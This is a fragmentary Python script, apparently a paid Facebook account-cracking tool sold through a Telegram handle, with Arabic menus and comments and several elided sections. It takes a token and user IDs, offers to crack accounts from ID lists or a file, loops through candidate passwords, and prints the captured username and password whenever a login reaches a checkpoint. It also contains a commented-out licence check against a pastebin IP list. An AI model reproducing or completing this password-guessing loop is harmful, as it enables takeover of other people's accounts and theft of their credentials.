يعب م تتعود علي المجان تعال اشترك اسبوع خليني اترزق 🙂💔
...
g= datetime.datetime(2023, 11, 9, 7, 10 ,9)

# if (x.strftime("%x"))>(g.strftime("%x")):
 # print('\n\n')
 # print("     "+'وقفتها اذا حابي تشترك راسل كونان للاشتراك @KO00NAN'
 # print('\n\n')
 # print(x)
...
# url = requests.get('https://pastebin.com/nZU5sMzp').text
# if ipp in url:
    # os.system('clear')
# else:
    # print('')
...
C1 = '\033[2;35m'
print(('—'*25)+'\n• DeCoDe By @KO00NAN •\n'+('—'*25))
token=input(C+'تــوڪــن  : TOKEN: '+C)
print('\n')
print('\n')
ID=input(C+'ايــديـ  : ID   : '+C)
print('\n')
os.system('clear')
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
...
def menu(my_name,my_id):
	...
	banner()
	print(('—'*25)+'\n• DeCoDe By @KO00NAN •\n'+('—'*25))
	print(C+' عمكم كونان م مقصر معاكم م تقصرو منو بي صور الصيد') 
	print(C+'يلا ي عيال رسلولي صور الصيد هون @KO00NAN')
	print(C+'V I P  :  🔱')
	print(Y+'_'*30)
	print(f'>> Your ĮĎ : '+str(my_id))
	print(f'>> Your ĮƤ  : {ip}')
	print(Y+'_'*30)
	print(C+' 1. No Crack م شغالة حب ✖️')
	print(Y+'_'*30)
	print(C+'2 . ID  : من عدة ايديات ✔️')
	print(Y+'_'*30)
	print(C+' 3. Crack File : من ملف ✔️')
	print(Y+'_'*30)
#	print('>> 4. Crack Grup : من كروبات      ✖')		
	print(C+' 0. login out : تسجيل خروج  ✔️') 
	print(Y+'_'*30)
	Meledak = input('[•] Pilih اختار  : ')
	print('')
	if Meledak in ['1']:
		dump_publik()
	elif Meledak in ['2']:
...
def setting():
	...
	print('\033[1;97m1 - صيد قديم وجديد')
	
	print('')

	hu = input('\034[1;97m[*] Pilih اختار  : ')
	if hu in ['','old']:
	...
	print('')
	print('\033[1;97m1 - من الجوال')
	
	print('')

	hc = input('\034[1;97m[*] Pilih اختار  : ')
	if hc in ['1','01']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 كونان جابلك حساب قافل ✖️
•─────━𓆩KONAN𓆪‏━─────•
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
•─────━𓆩مدفوعة𓆪━─────•
@KO00NAN صور الصيد هون 	
					'''
...
def getkey():
    ...
    try:
        ...
        print("")
        print('')
        print("\033[0m Telegram: @KO00NAN ");time.sleep(2)
        print ("")
